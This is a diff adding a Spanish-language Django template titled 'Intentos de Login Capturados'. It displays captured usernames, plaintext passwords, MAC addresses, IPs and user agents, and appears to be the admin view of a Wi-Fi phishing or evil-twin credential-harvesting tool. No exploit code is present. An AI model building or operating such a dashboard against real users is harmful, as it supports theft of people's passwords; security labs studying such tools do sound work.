@@ -1,0 +1,61 @@
+{% extends 'board/base.html' %}
+{% block content %}
+<div class="container mt-4">
+  <h2 class="mb-4 text-center">
+        <span style="font-weight:600;">🕵️‍♂️ Intentos de Login Capturados</span>
+  </h2>
+  <div class="table-responsive">
+    <table class="table table-striped align-middle">
+      <thead class="table-dark">
+        <tr>
+          <th>Usuario</th>
+          <th>Contraseña</th>
+          <th>MAC</th>
+          <th>AP</th>
+          <th>User-Agent</th>
+          <th>Fecha</th>
+          <th>Host</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for intento in capturados %}
+        <tr>
+          <td>{{ intento.usuario }}</td>
+          <td><code>{{ intento.clave }}</code></td>
+          <td>
+            {% if intento.mac and intento.mac != "00:00:00:00:00:00" %}
+              <a href="{% url 'mac_detail' intento.mac %}" class="badge bg-primary text-decoration-none">
+                {{ intento.mac }}
+              </a>
+            {% else %}
+              <span class="text-muted">No detectada</span>
+            {% endif %}
+          </td>
+          <td>{{ intento.ip }}</td>
+          <td style="max-width: 300px;">
+            <code 
+              data-bs-toggle="tooltip" 
+              data-bs-placement="top" 
+              title="{{ intento.user_agent|escape }}">
+              {{ intento.user_agent|truncatechars:40 }}
+            </code>
+          </td>
+          <td>{{ intento.fecha|date:"Y-m-d H:i:s" }}</td>
+          <td>{{ intento.host }}</td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- Script para activar tooltips -->
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+    tooltipTriggerList.forEach(function (tooltipTriggerEl) {
+      new bootstrap.Tooltip(tooltipTriggerEl)
+    })
+  });
+</script>
+{% endblock %}
